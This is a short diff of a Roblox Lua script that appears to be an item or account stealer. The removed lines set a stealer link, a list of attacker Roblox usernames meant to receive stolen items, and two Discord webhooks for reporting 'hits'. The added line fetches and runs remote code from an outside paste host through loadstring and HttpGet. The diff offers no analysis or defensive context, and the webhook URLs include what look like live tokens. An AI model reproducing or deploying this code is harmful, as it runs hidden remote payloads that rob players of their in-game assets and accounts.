@@ -237,21 +237,7 @@ pcall(function()
         end
     end
 
-    STEALER_LINK = ''
-    
-    Usernames = {
-        't_cheloux', -- PUT UR ROBLOX USERNAMES
-        'Dont_Distrubs', -- AS MANY AS U WANT BUT DONT FORGET ,
-        'Dont_Distrubs2',
-        'Dont_Distrubs3',
-        'anfall38',
-        'mousta34',
-    }
-    
-    BigHitsWebhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI"
-    SmallHitsWebhook = "https://discord.com/api/webhooks/1407225870078316554/vgHKGq8V95gJuEWQeKWGwLOf1_mBV24Blncyp9FhO9hZbANFlYXEMvXCUO9catjJqPoz"
-    
-    loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/rM3nYtag7EmqdS68/raw", true))()
 
     
     -------------------
